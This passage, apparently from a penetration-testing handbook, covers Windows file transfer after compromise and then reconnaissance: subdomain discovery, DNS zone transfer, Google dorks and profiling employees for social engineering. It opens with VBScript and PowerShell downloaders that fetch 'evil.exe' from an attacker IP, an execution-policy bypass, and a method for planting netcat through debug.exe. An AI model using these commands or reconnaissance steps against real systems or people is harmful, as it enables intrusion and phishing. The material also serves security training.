echo http.Open "GET",strURL,False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
You then execute the script like this:

Transfering files on Windows
cscript wget.vbs http://192.168.10.5/evil.exe evil.exe
PowerShell
This is how we can download a file using PowerShell. Remember since we only have a non-
interactive shell we cannot start PowerShell.exe, because our shell can't handle that. But we can get
around that by creaing a PowerShell-script and then executing the script:
echo $storageDir = $pwd > wget.ps1
echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "http://192.168.1.101/file.exe" >>wget.ps1
echo $file = "output-file.exe" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1
Now we invoke it with this crazy syntax:
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
Debug.exe
This is a crazy technique that works on windows 32 bit machines. Basically the idea is to use the
debug.exe program. It is used to inspect binaries, like a debugger. But it can also rebuild them
from hex. So the idea is that we take a binaries, like netcat. And then disassemble it into hex, paste
it into a file on the compromised machine, and then assemble it with debug.exe.
Debug.exe can only assemble 64 kb. So we need to use files smaller than that. We can use upx to
compress it even more. So let's do that:
upx -9 nc.exe
Now it only weights 29 kb. Perfect. So now let's disassemble it:
wine exe2bat.exe nc.exe nc.txt
Now we just copy-past the text into our windows-shell. And it will automatically create a file called
nc.exe

Terminology
Let's start with some terminology. We often hear the words egress filtering and ingress in connection
to talk about firewalls and routers.
Egress filtering
This basically means that we are filtering outgoing traffic. So egress filtering ensures that malicious,
or just prohibited, traffic is not allowed to leave the network. Of course egress filtering then is the
enemy of the hacker.

Recon and Information Gathering Phase
Recon and Information Gathering Phase
Recon and Information Gathering Phase
So once you have decided on a target you want to start your recon-process.
The recon-phase is usually divided up into two phases.
1. Passive information gathering / OSINT This is when you check out stuff like:
Web information
Email Harvesting
Whois enumeration
2. Active information gathering
This is when you start scanning the target with your different tools.

Passive information gathering
It is passive in the meaning that it doesn't directly send packets to the service. But in any other sense
of the word there is nothing passive about this phase.
Visit the website
Okay, I guess this actually sends packets to the target, but whatever. Visit the page, look around, read
about the target. What do they do?
Whois
Find out who is behind the website.
Resolve the DNS
host website.com
nslookup website.com
The the IP address and check it with whois
whois 192.168.1.101
Netcraft
Most of the info found on netcraft is not unique. It is basic whois info. But one thing is really good, it
lists the different IP-addresses the page has had over the years. This can be a good way to bypass
cloudflare and other services that hide the real IP. Using netcraft we can find the IP that was in use
before they implemented cloudflare.
Another detail that is good to know is the hosting-company or domain-provider. Those details can
be used if we want to try some social-engineering or spear-phishing attack.

Find Subdomains
Find Subdomains
Finding subdomains is fundamental. The more subdomains you find, the bigger attack surface you
have. Which means bigger possibility of success.
For now this seems to be a very comprehensive list of tools to find subdomains.

DNS Basics
DNS Basics
This is the best article I have found about how the DNS-system works. Form the highest to the lowest
level.
An introduction to dns-terminology components and concepts
Before we begin to look at the specific techniques that exists to find subdomains, lets try to
understand what subdomains are and how they work.
A - records
A stands for address.
The A record maps a name to one or more IP addresses, when the IP are known and stable. So that
would be 123.244.223.222 => example.com
AAAA - points to a IPv6 Record
CNAME
The CNAME record connects a name to another name. An example of that would be:
www.example.com,CNAME,www.example.com.cdn.cloudflare.net.
Another example is. If you have the domains mail.example.com and webmail.example.com. You can
have webmail.example.com point to mail.example.com. So anyone visiting webmail.example.com
will see the same thing as mail.example.com. It will NOT redirect you. Just show you the same
content.
Another typical usage of CNAME is to link www.example.com to example.com
CNAME is quite convenient. Because if you change the A-record. The IP-address, you don't need to
change the other subdomains, like ftp.example.com or www.example.com. Since they both point to
example.com, which is a A-record and points directly to the IP.
Another note. If foo.example.com points to bar.example.com, that mean that bar.example.com is the
CNAME (Canonical/real/actual Name) of foo.example.com.
Alias
Kind of like CNAME in that it points to another name, not an IP.
MX - Mail exchange

Find Subdomains
Finding subdomains is fundamental. The more subdomains you find, the bigger attack surface you
have. Which means bigger possibility of success.
For now this seems to be a very comprehensive list of tools to find subdomains.
https://blog.bugcrowd.com/discovering-subdomains
Some tools find some stuff, other tools other stuff. So your best bet is to use a few of them together.
Don't forget to brute-force recursively!
recon-ng
In order to find subdomains we can use the recon-ng framework. It has the same basic structure as
metasploit. You can learn more about this tool in the tools-section.
recon-ng
use use recon/domains-hosts/
# This will give you a vast amount of alternatives.
show options
set source cnn.com
All these subdomains will be saved in hosts, which you can access though: show hosts
If some of these subdomains are not given IPs automatically you can just run
use recon/hosts-hosts/resolve
run
And it will resolve all the hosts in the hosts-file.
Google Dorks
Using google we can also find subdomains.
This will only give us the subdomains of a site.
site:msn.com -site:www.msn.com
site:*.nextcloud.com
To exclude a specific subdomain you can do this:
site:*.nextcloud.com -site:help.nextcloud.com

subbrute.py
The basic command is like this
./subbrute.py -p cnn.com
https://github.com/TheRook/subbrute
Knock
I haven't tested this yet. https://github.com/guelfoweb/knock
Being smart
You also have to look at what kind of system the target has. Some web-apps give their clients their
own subdomains. Like github.
Check out the homepage Often companies brag about their clients. You can use this to guess the
subdomains of some clients.
Reverse DNS-lookup
If you manage to figure out the IP range that the target owns (see section about nmap below). You can
see which machines are online. And then you can run a script to find out the domain-addresses of
those machines. That way you might find something new.
The text-file onlyIps.txt is a textfile with one IP-address on each line.
#!/bin/bash
while read p; do
echo $p;
host $p
done <onlyIps.txt
Here are some more tools that can do reverse lookup http://www.cyberciti.biz/faq/how-to-test-or-

DNS Zone Transfer Attack
DNS Zone Transfer Attack
Sometimes DNS servers are misconfigured. The DNS server contains a Zone file which it uses to
replicate the map of a domain. They should be configured so that only the replicating DNS-server can
access it, but sometimes it is misconfigured so anyone can request the zone file, and thereby recieve
the whole list of subdomains. This can be done the following way:
To do this we first need to figure out which DNS-servers a domain has.
host -t ns wikipedia.com
host -l wikipedia.com ns1.wikipedia.com
This can also be done with tools such as dnsrecon and dnsenum.

Identifying People
Identifying People
Identifying People
We want to find out how is connected to the target. That can be site administrator, employees, owner,
mods. Maybe one of the administrators have posted in a forum with their email, or in a newsgroup or
somewhere else. Those posts could contain useful data about the stack or help us devlop a network
diagram. We might also need to use social engineering.
In order to find people we might use the following sources:
The company website
Social media (LinkedIn, Facebook, Twitter etc)
Forums and newsgroups
Metadata from documents
Company Website
This is pretty obvious. Just look around on the website. Or download it. Or spider it with burp and
then search the result.
Make sure to check out the blog. There you might have employees writing blogposts under their
name.
Social Media
site:twitter.com companyname
site:linkedin.com companyname
site:facebook.com companyname
Metadata From Documents
You find some documents and then run exiftool on them to see if there is any interesting metadata.

Search Engine Discovery
Search Engine Discovery
Search Engine Discovery
Search engines can be very useful for finding information about the target. Search engines can be
used for two things:
Finding sensitive information on the domain that you are attacking
Finding sensitive information about the company and its employees in on other parts of the
internet. Like forums, newsgroups etc.
Remember that the world is bigger than google. So test out the other search engines.
Baidu, binsearch.info, Bing, DuckDuckGo, ixquick/Startpage, Shodan,PunkSpider
Google is a good tool to learn more about a website.
Finding specific filetypes
filetype:pdf
Search within webaddress
site:example.com myword
Find in url
inurl:test.com
Wild cards
You can use the asterisk to as a wildcard:
*
Example:
"I've been * for a heart"
This will return answers where * is anything.
Exclude words
-
the dash excludes a specific word
This query searches for pages that used the word bananasplit.
